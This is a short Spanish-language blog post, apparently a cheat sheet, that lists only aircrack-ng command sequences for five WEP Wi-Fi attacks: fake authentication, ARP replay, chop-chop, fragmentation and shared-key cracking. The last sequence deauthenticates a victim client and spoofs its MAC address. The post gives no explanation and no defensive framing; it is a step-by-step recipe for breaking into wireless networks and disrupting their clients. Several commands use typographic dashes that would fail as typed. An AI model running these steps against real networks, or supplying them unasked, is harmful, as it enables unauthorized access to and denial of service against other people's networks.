---
date: 2021-10-04T02:06:12.000Z
layout: post
comments: true
title: Ataques WEP
subtitle: 'Redes inalámbricas'
description: >-
image: >-
  http://imgfz.com/i/a2EkBG1.jpeg
optimized_image: >-
  http://imgfz.com/i/a2EkBG1.jpeg
category: ciberseguridad
tags:
  - Wifi
  - monitor
  - hacking
  - redes
author: Felipe Canales Cayuqueo
paginate: true
---

## Fake Authentication Attack

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airmon-ng start wlan0

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ macchanger --show wlan0mon #MAC

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -1 0 -a <BSSID> -h <nuestraMAC> -e <ESSID> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <nuestraMAC> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aircrack-ng –b <BSSID> <archivoPCAP>
```

## ARP Replay Attack

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airmon-ng start wlan0

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ macchanger --show wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <nuestraMAC> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aircrack-ng –b <BSSID> <archivoPCAP>
```

## Chop Chop Attack

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airmon-ng start wlan0

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ macchanger --show wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -4 –b <BSSID> -h <nuestraMAC> wlan0mon
# Se presiona ‘y’ ;

┌─[root@kali]─[/Documents/WiFi/]
└──╼ packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -2 –r <FileName2> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aircrack-ng <archivoPCAP>
```

## Fragmentation Attack

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airmon-ng start wlan0

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ macchanger --show wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -5 –b<BSSID> -h <nuestraMAC > wlan0mon
# Se presiona ‘y’ ;

┌─[root@kali]─[/Documents/WiFi/]
└──╼ packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -2 –r <FileName2> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aircrack-ng <archivoPCAP>
```

## SKA Type Cracking

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airmon-ng start wlan0

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -0 10 –a <BSSID> -c <macVictima> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ ifconfig wlan0mon down

┌─[root@kali]─[/Documents/WiFi/]
└──╼ macchanger –-mac <macVictima> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ ifconfig wlan0mon up

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -3 –b <BSSID> -h <macFalsa> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng –-deauth 1 –a <BSSID> -h <macFalsa> wlan0mon

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aircrack-ng <archivoPCAP>
```
